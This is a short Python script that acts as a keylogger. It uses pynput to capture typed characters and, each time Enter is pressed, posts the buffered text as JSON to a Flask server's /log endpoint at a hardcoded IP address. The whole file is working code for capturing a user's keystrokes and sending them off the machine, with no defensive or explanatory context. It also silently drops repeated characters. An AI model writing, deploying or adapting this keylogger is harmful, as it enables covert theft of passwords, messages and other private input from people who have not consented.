import requests
from pynput.keyboard import Key, Listener
print("code is running")
SERVER_IP = "192.168.1.39"  # Replace with your Flask server's IP
SERVER_URL = f"http://{SERVER_IP}:5000/log"

buffer = ""  # Store typed words before sending
last_key = None 

def on_press(key):
    global buffer, last_key

    try:
        if key.char:
            if key.char != last_key:
                buffer += key.char
                last_key = key.char
    except AttributeError:
        if key == Key.space:
            buffer += " "
        elif key == Key.enter:
            send_to_server(buffer)
            buffer = ""
        elif key == Key.esc:
            return False

    last_key = key

def send_to_server(text):
    if text:
        data = {"key": text}
        try:
            requests.post(SERVER_URL, json=data)
        except requests.exceptions.RequestException as e:
            print("Error sending data:", e)

def on_release(key):
    pass

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
